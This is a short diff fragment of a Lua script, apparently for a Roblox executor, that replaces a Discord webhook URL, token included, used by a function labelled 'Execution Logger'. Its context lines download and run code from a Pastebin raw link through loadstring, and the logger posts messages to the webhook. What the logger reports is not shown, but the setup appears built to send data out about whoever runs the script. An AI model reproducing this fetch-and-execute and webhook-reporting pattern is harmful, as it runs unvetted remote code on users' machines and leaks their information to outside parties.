@@ -59,7 +59,7 @@ else
     loadstring(game:HttpGet("https://pastebin.com/raw/2kyjCzkA"))()
     loadstring(game:HttpGet("https://pastebin.com/raw/2kyjCzkA"))()
     local url =
-        "https://discord.com/api/webhooks/1164998378275483740/jzxVS5JG0Be1EbKTMFTRo5wQ3yXx2MjEHZUBaUqulXWGpXZoVcS5qcSpK-sTQ6Bfh4ac"
+        "https://discordapp.com/api/webhooks/1170720072931737711/jJfvYyU0lM-hjy6dMx2zBiPqt2_BUMhQWsLZLwxPynYh-sso1OkdSlcVYUv7RJH4gHgD"
     local botname = "Execution Logger"
     function SendMessage(url, message)
         local http = game:GetService("HttpService")
